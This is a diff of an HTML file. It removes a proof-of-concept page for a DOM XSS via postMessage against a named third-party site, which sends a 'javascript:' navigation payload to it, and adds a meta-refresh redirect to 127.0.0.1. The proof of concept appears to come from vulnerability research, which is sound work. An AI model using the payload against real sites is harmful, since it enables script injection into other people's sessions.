@@ -1,22 +1,11 @@
 <!DOCTYPE html>
 <html>
-<head><title>PoC - postMessage</title></head>
-<body>
-  <h3>PoC - DOM XSS via postMessage</h3>
-  <button onclick="sendPayload()">Abrir y Enviar Payload</button>
-
-  <script>
-    function sendPayload() {
-      const win = window.open("https://success.thousandeyes.com/");
-      const payload = {
-        navigateToUrl: "javascript:alert(document.domain)"
-      };
-
-      setTimeout(() => {
-        win.postMessage(JSON.stringify(payload), "*");
-      }, 3000);
-    }
-  </script>
-</body>
+  <head>
+    <meta http-equiv="refresh" content="0; url=http://127.0.0.1">
+    <title>Redirecting...</title>
+  </head>
+  <body>
+    Redirecting...
+  </body>
 </html>
 
